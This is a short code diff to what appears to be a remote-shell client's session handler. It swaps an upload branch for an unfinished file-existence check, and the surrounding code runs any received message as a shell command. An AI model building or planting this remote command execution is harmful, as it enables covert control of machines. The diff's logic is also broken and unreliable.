@@ -74,10 +74,16 @@ def session_handler():
                 pass
 
             # Work in progress
-            elif message == 'upload' or message == 'up':
-                download_file(message[7:])
-                outbound('File Downloaded')
-                continue
+            elif message == 'download':
+                file_dl = message.strip('download ')
+                if os.path.exists(file_dl):
+                    exists = "yes"
+                    outbound(exists)
+                else:
+                    exists = "no"
+                    outbound(exists)
+                    continue
+
             else:
                 command = subprocess.Popen(message,
                                            shell=True,
